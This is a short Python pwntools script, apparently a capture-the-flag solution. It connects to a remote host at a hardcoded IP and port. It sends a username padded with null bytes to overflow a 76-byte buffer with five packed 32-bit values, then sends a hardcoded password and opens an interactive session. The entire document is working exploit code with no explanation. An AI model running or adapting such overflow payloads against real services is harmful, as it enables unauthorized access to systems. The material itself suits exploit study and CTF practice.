from pwn import *

r = remote("194.5.207.113", 7020)

user = "AlexTheUser"
pwd = "4l3x7h3p455w0rd"
a = 123
b = 76
c = 187
d = 30
e = 233
payload1 = user + "\x00"*(76 - len(user)) + p32(e) + p32(d) + p32(c) + p32(b) + p32(a)
r.sendline(payload1)
r.sendline(pwd)

r.interactive()